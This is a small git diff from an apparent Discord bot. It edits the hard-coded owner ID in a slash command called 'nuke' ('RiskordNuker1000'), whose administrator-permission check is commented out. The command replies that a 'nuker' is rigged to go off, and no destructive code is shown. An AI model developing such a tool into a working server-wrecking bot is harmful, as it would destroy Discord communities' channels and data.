@@ -46,7 +46,7 @@ async def load_cog(interaction: discord.Interaction, extension: str):
 @tree.command(name="nuke", description="RiskordNuker1000", guild=discord.Object(id=server_id))
 #@discord.app_commands.checks.has_permissions(administrator=True)
 async def load_cog(interaction: discord.Interaction):
-    if interaction.user.id == 432437043956:
+    if interaction.user.id == 432437043956809738:
         await interaction.response.send_message("✅ Nuker rigged to set off <t:1761421140:R>")
     else:
         await interaction.response.send_message("Not owner")
